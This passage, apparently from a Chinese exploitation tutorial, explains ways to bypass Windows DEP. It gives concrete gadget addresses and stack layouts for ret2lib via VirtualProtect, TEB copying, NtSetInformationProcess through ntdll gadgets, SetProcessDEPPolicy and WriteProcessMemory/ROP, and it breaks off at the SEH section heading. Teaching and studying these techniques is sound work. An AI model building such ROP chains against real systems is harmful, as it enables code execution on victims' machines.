
进入`/path/to/xxx`目录，找到`xxx.json`。

由于后期系统 dll 加入了 ASDL 保护，因此我们可以选用未开启 ASLR 的第三方 DLL 文件，示例如下（这里使用迅雷 IE 插件）：

`XunleiBHO7.1.6.2194.dll`(DEP/ NO ASLR)

```
.text:211D18F5                  call    ds:VirtualProtect
.text:211D18FB                  pop     esi
.text:211D18FC                  pop     ebp
.text:211D18FD                  retn    0Ch
```

栈空间布局：

`41414141`  垃圾字节（共 3088 字节）

……

`211D18F5`  返回地址

`41414141`  平衡堆栈（视漏洞函数的具体情况而定）

`07c50000`  `lpAddress`(shellcode 地址)

`00001000`   `dwSize`

`00000040`   `flNewProtect` (`PAGE_EXECUTE_READWRITE`)

`07c50020`   `lpflOldProtect` (可写地址)

`41414141`  平衡 `pop esi` 使用的堆栈

`41414141`  平衡 `pop ebp` 使用的堆栈

`07c50000`  返回地址，指向 shellcode

在一次实际利用中，我使用了 COMODO 主动防御软件中的 `guard32.dll` 来定位 `VirtualProtect` 函数：

```
#1002CA33  -FF25 E8F30310    JMP DWORD PTR DS:[1003F3E8]  [Module : guard32.dll]
# jmp to here
#6FFF04C0   8BFF             MOV EDI,EDI
#6FFF04C2   55               PUSH EBP
#6FFF04C3   8BEC             MOV EBP,ESP
#6FFF04C5  -E9 E64BFF06      JMP kernel32.76FE50B0
# jmp to here
#76FE50B0   5D               POP EBP
#76FE50B1  ^E9 02D0FBFF      JMP <JMP.&API-MS-Win-Core-Memory-L1-1-0.VirtualProtect>
# jmp to here
#76FA20B8  -FF25 1019FA76    JMP DWORD PTR DS:[<&API-MS-Win-Core-Memory-L1-1-0.VirtualProtect>; KERNELBA.VirtualProtect
```

关于 `ret2lib` 技术的更多信息可参考资料：http://www.infosecwriters.com/text_resources/pdf/return-to-libc.pdf

## 2.利用 TEB 突破 DEP

在之前的《黑客防线》中有篇文章《SP2 下利用 TEB 执行 ShellCode》，有兴趣的读者可以翻看黑防出版的《缓冲区溢出攻击与防范专辑》，上面有这篇文章。该作者在文中提到一种利用 TEB（线程环境块）来突破 DEP 的方法，不过它受系统版本限制，只能在 XP sp2 及其以下版本的 windows 系统上使用，因为更高版本的系统，其 TEB 地址是不固定的，每次都是动态生成的。该方法的具体实现方法如下：

（1）将返回地址覆盖成字符串复制函数的地址，比如 `lstrcpy`，`memcpy` 等等；

（2）在返回地址之后用目标内存地址和 shellcode 地址覆盖，当执行复制操作时，就会将 shellcode 复制到目标内存地址，该目标内存地址位于 TEB 偏移 `0xC00` 的地方，它有 520 字节缓存用于 ANSI-to-Unicode 函数的转换；

（3）复制操作结束后返回到 shellcode 地址并执行它。

此时其堆栈布局如下：

```
┏━━━━━━━┓
【shellcode  】
【save ebp  】
【lstrcpy  】
【TEB 缓存地址  】<= 用于复制结束后返回到 shellcode
【TEB 缓存地址  】
【ShellCode 地址  】
┗━━━━━━━┛
```

## 3.利用 NtSetInformationProcess 关闭 DEP

关于此方法最原始的资料应该是黑客杂志《uninformed》上的文章《Bypassing Windows Hardware-enforced Data Execution Prevention》（http://www.uninformed.org/?v=2&a=4），另外也可以看下本人之前翻译的《突破 win2003 sp2 中基于硬件的 DEP》（http://bbs.pediy.com/showthread.php?t=99045），此方法的主要原理就是利用 `NtSetInformationProcess()` 函数来设置 `KPROCESS` 结构中的相关标志位，进而关闭 DEP，`KPROCESS` 结构中相关标志位情况如下：

```
0:000> dt nt!\_KPROCESS -r
ntdll!\_KPROCESS
. .
+0x06b Flags       : \_KEXECUTE\_OPTIONS
  +0x000 ExecuteDisable     : Pos 0, 1 Bit
  +0x000 ExecuteEnable     : Pos 1, 1 Bit
  +0x000 DisableThunkEmulation   : Pos 2, 1 Bit
  +0x000 Permanent     : Pos 3, 1 Bit
  +0x000 ExecuteDispatchEnable   : Pos 4, 1 Bit
  +0x000 ImageDispatchEnable   : Pos 5, 1 Bit
  +0x000 Spare       : Pos 6, 2 Bits
```

当 DEP 被启用时，`ExecuteDisable` 被置位，当 DEP 被禁用，`ExecuteEnable` 被置位，当 `Permanent` 标志置位时表示这些设置是最终设置，不可更改。代码实现：

```
ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE;
NtSetInformationProcess(
  NtCurrentProcess(),   // ProcessHandle = -1
  ProcessExecuteFlags,  // ProcessInformationClass = 0x22（ProcessExecuteFlags）
  &ExecuteFlags,        // ProcessInformation = 0x2（MEM_EXECUTE_OPTION_ENABLE）
  sizeof(ExecuteFlags));    // ProcessInformationLength = 0x4
```

具体实现思路（以我电脑上 VirtualBox 虚拟机下的 xp sp3 为例）：

1.将 `al` 设置为 1，比如指令 `mov al,1` / `ret`，然后用该指令地址覆盖返回地址：

```
0:000> lmm ntdll
start    end        module name
7c920000 7c9b3000   ntdll      (pdb symbols)          c:\\symbollocal\\ntdll.pdb\\1751003260CA42598C0FB326585000ED2\\ntdll.pdb
0:000> s 7c920000 l 93000 b0 01 c2 04
7c9718ea  b0 01 c2 04 00 90 90 90-90 90 8b ff 55 8b ec 56  ............U..V
0:000> u 7c9718ea
ntdll!NtdllOkayToLockRoutine:
7c9718ea b001            mov     al,1
7c9718ec c20400          ret     4
```

由于上面的 `ret 4`，因此要再向栈中填充 4 字节（比如 `0xffffffff`）以抵消多弹出的 4 字节，如果选择的指令刚好是 `ret` 则无须再多填充 4 字节。

2.跳转到 `ntdll!LdrpCheckNXCompatibility` 中的部分代码（从 `cmp al,1` 开始，可通过 windbg 下的命令 `uf ntdll!LdrpCheckNXCompatibility` 来查看其反汇编代码），比如以下地址就需要用 `0x7c93cd24` 来覆写堆栈上的第二个地址：

```
ntdll!LdrpCheckNXCompatibility+0x13:
7c93cd24 3c01            cmp     al,1
7c93cd26 6a02            push    2
7c93cd28 5e              pop     esi
7c93cd29 0f84df290200    je      ntdll!LdrpCheckNXCompatibility+0x1a (7c95f70e)  ; 之前已将 al 置 1，故此处实现跳转
```

3.上面跳转后来到这里：

```
0:000> u 7c95f70e
ntdll!LdrpCheckNXCompatibility+0x1a:
7c95f70e 8975fc          mov     dword ptr [ebp-4],esi  ; [ebp-0x4]= esi = 2
;执行到这里的时候会发现 ebp-4(41414141-4 = 4141413d)而导致不可写，因此我们需要在前面调整下 ebp 的值，比如可以使用以下指令：
;- push esp / pop ebp / ret
;- mov esp,ebp / ret
;或者其它可调整 ebp 为可写地址的指令
7c95f711 e919d6fdff      jmp     ntdll!LdrpCheckNXCompatibility+0x1d (7c93cd2f)
```

4.上面跳转后来到：

```
0:000> u 7c93cd2f
ntdll!LdrpCheckNXCompatibility+0x1d:
7c93cd2f 837dfc00        cmp     dword ptr [ebp-4],0
7c93cd33 0f85f89a0100    jne     ntdll!LdrpCheckNXCompatibility+0x4d (7c956831) ; 由于不相等再次实现跳转
```

5.上面跳转后来到：

```
0:000> u 7c956831
ntdll!LdrpCheckNXCompatibility+0x4d:
7c956831 6a04            push    4     ;ProcessInformationLength = 4
7c956833 8d45fc          lea     eax,[ebp-4]
7c956836 50              push    eax      ;ProcessInformation = 2（MEM_EXECUTE_OPTION_ENABLE）
7c956837 6a22            push    22h       ;ProcessInformationClass = 0x22（ProcessExecuteFlags）
7c956839 6aff            push    0FFFFFFFFh
7c95683b e84074fdff      call    ntdll!ZwSetInformationProcess (7c92dc80)
7c956840 e92865feff      jmp     ntdll!LdrpCheckNXCompatibility+0x5c (7c93cd6d)
7c956845 90              nop
```

在这里调用函数 `ZwSetInformationProcess()`，而其参数也刚好达到我们关闭 DEP 的各项要求.

6.最后跳转到函数结尾：

```
0:000> u 7c93cd6d
ntdll!LdrpCheckNXCompatibility+0x5c:
7c93cd6d 5e              pop     esi
7c93cd6e c9              leave
7c93cd6f c20400          ret     4
```

最后的堆栈布局应为：

```
┏━━━━━━━━━━━━━━━━┓
【  AAA……        】   <= 填充数据
【  push esp/pop ebp/ret    】  <= 调整 ebp 为可写地址
【  al=1 地址      】  <= 返回地址
【  0xffffffff      】  <= 平衡堆栈
【LdrpCheckNXCompatibility 指令地址】  <= 指令 cmp al,0x1 的起始地址
【  0xffffffff      】  <= 平衡堆栈
【  "A" x 54       】  <= 调整 NX 禁用后的堆栈
【  call/jmp esp      】
【  shellcode      】    
┗━━━━━━━━━━━━━━━━┛
```

如果在禁用 NX 后，又需要读取 `esi` 或 `ebp`，但此时它们又被我们填充的数据覆盖掉了，那么我们可以使用诸如 `push esp/pop esi/ret` 或者 `push esp/pop ebp/ret` 这样的指令来调整 `esi` 和 `ebp`，以使关闭 DEP 后还能够正常执行。

辅助工具：`ImmDbg pycommand` 插件（`!pvefindaddr depxpsp3`  + `!findantidep`）

## 4.利用 SetProcessDEPPolicy 来关闭 DEP

适用在：Windows XP SP3，Vista SP1 和 Windows 2008。

为了能使这个函数有效，当前的 DEP 策略必须设成 OptIn 或者 OptOut。如果策略被设成

AlwaysOn（或者 AlwaysOff），然后 `SetProcessDEPPolicy` 将会抛出一个错误。如果一个模块

是以/NXCOMPAT 链接的，这个技术也将不会成功。最后，同等重要的是，它这能被进程调

用一次。因此如果这个函数已经被当前进程调用（如 IE8，当程序开始时已经调用它），它

将不成功。

Bernardo Damele 写了一篇关于这一技术的博文：

http://bernardodamele.blogspot.com/2009/12/dep-bypass-with-setprocessdeppolicy.html

函数原型如下：

```
BOOLWINAPI SetprocessDEPPolicy(
  __in DWORD dwFlags
);
```

这个函数需要一个参数，并且这个参数必须设置为 0，以此禁用当前进程的 DEP。

为了在 ROP 链中使用这个函数，你需要在栈上这样设置：

●指向 `SetProcessDEPPolicy` 的指针

●指向 `shellcode` 的指针

●0

指向 `shellcode` 的指针用于确保当 `SetProcessDEPPolicy()` 执行完 ROP 链后会跳到 shellcode。

在 XP SP3 下 `SetProcessDEPPolicy` 的地址是 `7C8622A4`（`kernel32.dll`）

## 5.利用 WPN 与 ROP 技术

`ROP`（Return Oriented Programming）:连续调用程序代码本身的内存地址，以逐步地创建一连串欲执行的指令序列。

`WPM`（Write Process Memory）：利用微软在 `kernel32.dll` 中定义的函数比如：`WriteProcess Memory` 函数可将数据写入到指定进程的内存中。但整个内存区域必须是可访问的，否则将操作失败。

具体实现方法参见我之前翻译的文章《利用 WPN 与 ROP 技术绕过 DEP》：http://bbs.pediy.com/showthread.php?t=119300

## 6.利用 SEH 绕过 DEP
